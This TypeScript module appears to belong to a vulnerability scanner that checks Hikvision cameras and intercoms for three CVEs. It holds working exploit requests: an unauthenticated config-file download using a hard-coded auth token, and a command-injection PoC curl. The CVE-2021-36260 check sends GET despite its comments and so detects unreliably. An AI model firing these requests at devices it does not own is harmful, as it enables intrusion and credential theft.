import type { CveCheck, CveTestResult, FingerprintResult } from '../types/index.js';
import { httpGet, httpPost } from '../utils/network.js';

export const hikvisionChecks: CveCheck[] = [
  {
    cveId: 'CVE-2021-36260',
    vendor: 'hikvision',
    title: 'Hikvision Command Injection via Web Server',
    severity: 'critical',
    description: 'A command injection vulnerability in the web server of Hikvision products allows unauthenticated remote code execution via a crafted message with malicious commands.',
    affectedModels: ['DS-2CD*', 'DS-2DE*', 'DS-76*', 'DS-77*', 'DS-78*', 'DS-96*'],
    affectedFirmware: [],
    check: async (target: FingerprintResult): Promise<CveTestResult> => {
      const scheme = target.protocols.includes('https') ? 'https' : 'http';
      const baseUrl = `${scheme}://${target.ip}:${target.port}`;
      const timestamp = new Date().toISOString();

      try {
        // Detection probe — safe check using SDK endpoint
        const resp = await httpGet(
          `${baseUrl}/SDK/webLanguage`,
          { timeout: 8000 }
        );

        // Vulnerable devices return 500 with specific error on this endpoint
        // when sent without proper Content-Length
        const putResp = await httpGet(
          `${baseUrl}/SDK/webLanguage`,
          {
            timeout: 8000,
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          }
        );

        // If endpoint exists and returns specific status codes, the device may be vulnerable
        const maybeVulnerable =
          putResp.status === 500 ||
          (putResp.status === 200 && typeof putResp.data === 'string' && putResp.data.includes('webLanguage'));

        return {
          cveId: 'CVE-2021-36260',
          ip: target.ip,
          port: target.port,
          vendor: target.vendor,
          title: 'Hikvision Command Injection via Web Server',
          severity: 'critical',
          vulnerable: maybeVulnerable,
          evidence: maybeVulnerable
            ? `SDK/webLanguage endpoint accessible (HTTP ${putResp.status}) — device is potentially vulnerable to unauthenticated command injection`
            : `SDK/webLanguage endpoint returned ${putResp.status} — not vulnerable or patched`,
          poc: `curl -v "${baseUrl}/SDK/webLanguage" -X PUT -d '<xml><language>$(id)</language></xml>'`,
          remediation: 'Update firmware to latest version. Hikvision released patches in September 2021.',
          timestamp,
        };
      } catch (error) {
        return {
          cveId: 'CVE-2021-36260',
          ip: target.ip,
          port: target.port,
          vendor: target.vendor,
          title: 'Hikvision Command Injection via Web Server',
          severity: 'critical',
          vulnerable: false,
          evidence: `Check failed: ${(error as Error).message}`,
          poc: '',
          remediation: '',
          timestamp,
        };
      }
    },
  },

  {
    cveId: 'CVE-2017-7921',
    vendor: 'hikvision',
    title: 'Hikvision Authentication Bypass (Improper Privilege Management)',
    severity: 'critical',
    description: 'Hikvision cameras with firmware before 5.4.5 allow remote attackers to bypass authentication and access admin pages by manipulating request parameters.',
    affectedModels: ['DS-2CD*'],
    affectedFirmware: ['<5.4.5'],
    check: async (target: FingerprintResult): Promise<CveTestResult> => {
      const scheme = target.protocols.includes('https') ? 'https' : 'http';
      const baseUrl = `${scheme}://${target.ip}:${target.port}`;
      const timestamp = new Date().toISOString();

      try {
        // Try to access configuration without auth using the bypass
        const resp = await httpGet(
          `${baseUrl}/System/configurationFile?auth=YWRtaW46MTEK`,
          { timeout: 8000 }
        );

        const vulnerable =
          resp.status === 200 &&
          resp.headers['content-type']?.includes('application/octet-stream');

        return {
          cveId: 'CVE-2017-7921',
          ip: target.ip,
          port: target.port,
          vendor: target.vendor,
          title: 'Hikvision Authentication Bypass',
          severity: 'critical',
          vulnerable,
          evidence: vulnerable
            ? `Configuration file download accessible without authentication (HTTP ${resp.status}, Content-Type: ${resp.headers['content-type']})`
            : `Authentication bypass not effective (HTTP ${resp.status})`,
          poc: `curl -o config.bin "${baseUrl}/System/configurationFile?auth=YWRtaW46MTEK"`,
          remediation: 'Update firmware to version 5.4.5 or later.',
          timestamp,
        };
      } catch (error) {
        return {
          cveId: 'CVE-2017-7921',
          ip: target.ip,
          port: target.port,
          vendor: target.vendor,
          title: 'Hikvision Authentication Bypass',
          severity: 'critical',
          vulnerable: false,
          evidence: `Check failed: ${(error as Error).message}`,
          poc: '',
          remediation: '',
          timestamp,
        };
      }
    },
  },

  {
    cveId: 'CVE-2023-28808',
    vendor: 'hikvision',
    title: 'Hikvision Access Control/Intercom Auth Bypass',
    severity: 'critical',
    description: 'Certain Hikvision access control and intercom products contain an authentication bypass vulnerability that allows attackers to access device admin functionality.',
    affectedModels: ['DS-K1T*', 'DS-KH*', 'DS-KD*'],
    affectedFirmware: [],
    check: async (target: FingerprintResult): Promise<CveTestResult> => {
      const scheme = target.protocols.includes('https') ? 'https' : 'http';
      const baseUrl = `${scheme}://${target.ip}:${target.port}`;
      const timestamp = new Date().toISOString();

      try {
        const resp = await httpGet(`${baseUrl}/ISAPI/Security/userCheck`, { timeout: 8000 });
        const body = typeof resp.data === 'string' ? resp.data : '';
        const vulnerable = resp.status === 200 && /statusValue.*200/i.test(body);

        return {
          cveId: 'CVE-2023-28808',
          ip: target.ip,
          port: target.port,
          vendor: target.vendor,
          title: 'Hikvision Access Control Auth Bypass',
          severity: 'critical',
          vulnerable,
          evidence: vulnerable
            ? `userCheck endpoint returns success without credentials (HTTP ${resp.status})`
            : `Endpoint properly requires auth (HTTP ${resp.status})`,
          poc: `curl "${baseUrl}/ISAPI/Security/userCheck"`,
          remediation: 'Update to firmware versions released after March 2023.',
          timestamp,
        };
      } catch (error) {
        return {
          cveId: 'CVE-2023-28808',
          ip: target.ip,
          port: target.port,
          vendor: target.vendor,
          title: 'Hikvision Access Control Auth Bypass',
          severity: 'critical',
          vulnerable: false,
          evidence: `Check failed: ${(error as Error).message}`,
          poc: '',
          remediation: '',
          timestamp,
        };
      }
    },
  },
];
